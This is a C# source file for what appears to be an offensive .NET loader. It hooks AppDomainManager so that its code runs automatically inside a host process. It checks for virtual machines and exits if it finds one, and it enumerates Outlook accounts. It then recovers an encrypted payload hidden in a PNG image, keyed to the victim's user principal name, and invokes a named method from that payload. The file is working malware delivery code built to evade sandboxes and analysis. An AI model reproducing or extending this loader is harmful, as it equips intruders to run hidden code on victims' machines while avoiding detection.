using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;

public sealed class MyAppDomainManager : AppDomainManager
{
    public override void InitializeNewDomain(AppDomainSetup appDomainInfo)
    {
        ClassExample.Execute();
        /*        bool res = ClassExample.Execute();

                return;*/
    }
}

public class ClassExample
{
    public static void Execute()
    {
        // hardcode args here

        // upn match steg
        string[] args = new string[] { "8.8.8.8", "-antivm", "-decryptupn", @".\Logo_copy.png", "Calc.Modes.RunCalc.Execute" };
        // bruteforce steg
        /*string[] args = new string[] { "8.8.8.8", "-antivm", "-stegload", @".\Logo_copy.png", "Calc.Modes.RunCalc.Execute" };*/
        Program.Main(args);
    }
}


public class Program
{
    public static void Main(string[] args)
    {
        bool noDNS = args.Contains("-NoDNS", StringComparer.OrdinalIgnoreCase);

        // If noDNS is not specified, perform DNS check
        if (!noDNS)
        {
            string inputIPAddress = args.FirstOrDefault(arg => !arg.StartsWith("-"));
            if (string.IsNullOrEmpty(inputIPAddress))
            {
                Console.WriteLine("DNS");
                return;
            }
            DNSCheck.CheckDNSAndContinue(inputIPAddress);
        }

        if (args.Contains("-antivm", StringComparer.OrdinalIgnoreCase))
        {
            // Check for virtualization
            if (Virtualization.Execute())
            {
                Console.WriteLine("Virtual machine detected. Exiting...");
                Environment.Exit(1);
            }
            /*            else
                        {
                            Console.WriteLine("No sandbox or debuggers found.");
                        }*/
        }

        // upn
        if (args.Contains("-listaccounts", StringComparer.OrdinalIgnoreCase))
        {
            /*UPN.DisplayUPNAndHash();*/
            UPN.ListOutlookAccounts();
            return; // Exit after displaying UPN and hash
        }
        if (args.Contains("-hash", StringComparer.OrdinalIgnoreCase))
        {
            int hashIndex = Array.IndexOf(args, "-hash");
            if (hashIndex >= 0 && hashIndex < args.Length - 1)
            {
                string input = args[hashIndex + 1];
                UPN.HashUPN(input);
            }
            else
            {
                Console.WriteLine("Please provide a string to hash after the -hash argument.");
            }
            return;
        }

        if (args.Contains("-hideupn", StringComparer.OrdinalIgnoreCase))
        {
            int hideIndex = Array.IndexOf(args, "-hideupn");
            if (hideIndex >= 0 && hideIndex < args.Length - 2)
            {
                string upn = args[hideIndex + 1];
                string imageFilePath = args[hideIndex + 2];
                string hashedValue = SteganographyHelper.GetSha256Hash(upn);
                SteganographyHelper.HideUPNInImage(imageFilePath, upn);
                Console.WriteLine($"UPN: {upn} has been hidden in {imageFilePath}");
                Console.WriteLine($"Hashed Value: {hashedValue}");
            }
            else
            {
                Console.WriteLine("Please provide a UPN and image file path after the -hideupn argument.");
            }
            return;
        }

        if (args.Contains("-getupn", StringComparer.OrdinalIgnoreCase))
        {
            int getIndex = Array.IndexOf(args, "-getupn");
            if (getIndex >= 0 && getIndex < args.Length - 1)
            {
                string imageFilePath = args[getIndex + 1];
                string retrievedHash = SteganographyHelper.RetrieveUPNFromImage(imageFilePath);
                Console.WriteLine($"Retrieved Hash: {retrievedHash}");
            }
            else
            {
                Console.WriteLine("Please provide an image file path after the -getupn argument.");
            }
            return;
        }
        if (args.Contains("-encryptupn", StringComparer.OrdinalIgnoreCase))
        {
            int encryptIndex = Array.IndexOf(args, "-encryptupn");
            if (encryptIndex >= 0 && encryptIndex < args.Length - 3)
            {
                string upn = args[encryptIndex + 1];
                string inputFilePath = args[encryptIndex + 2];
                string imageFilePath = args[encryptIndex + 3];
                string newImageFilePath = Path.Combine(Path.GetDirectoryName(imageFilePath), Path.GetFileNameWithoutExtension(imageFilePath) + "_copy" + Path.GetExtension(imageFilePath));

                SteganographyHelper.UPNEncrypt(inputFilePath, newImageFilePath, upn);
                Console.WriteLine($"UPN: {upn} has been encrypted and hidden in {newImageFilePath}");
            }
            else
            {
                Console.WriteLine("Please provide a UPN, input file path, and image file path after the -encryptupn argument.");
            }
            return;
        }

        if (args.Contains("-decryptupn", StringComparer.OrdinalIgnoreCase))
        {
            int decryptIndex = Array.IndexOf(args, "-decryptupn");
            if (decryptIndex >= 0 && decryptIndex < args.Length - 2)
            {
                string imageFilePath = args[decryptIndex + 1];
                string methodSignature = args[decryptIndex + 2];
                SteganographyHelper.UPNDecrypt(imageFilePath, methodSignature);
            }
            else
            {
                Console.WriteLine("Please provide an image file path and method signature after the -decryptupn argument.");
            }
            return;
        }

        // steg
        if (args.Contains("-stegload", StringComparer.OrdinalIgnoreCase))
        {
            string imageFilePath = args.SkipWhile(arg => !arg.Equals("-stegload", StringComparison.OrdinalIgnoreCase)).Skip(1).FirstOrDefault();
            string methodSignature = args.SkipWhile(arg => !arg.Equals("-stegload", StringComparison.OrdinalIgnoreCase)).Skip(2).FirstOrDefault();

            if (string.IsNullOrEmpty(methodSignature))
            {
                Console.WriteLine("Error: Method signature must be provided e.x. Calc.Modes.RunCalc.Execute");
                return;
            }

            try
            {
                Steg.ExStegDecryptAndLoad(imageFilePath, methodSignature);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error extracting hash, decrypting data, or invoking method: {ex.Message}");
            }
            return;
        }
    }
}
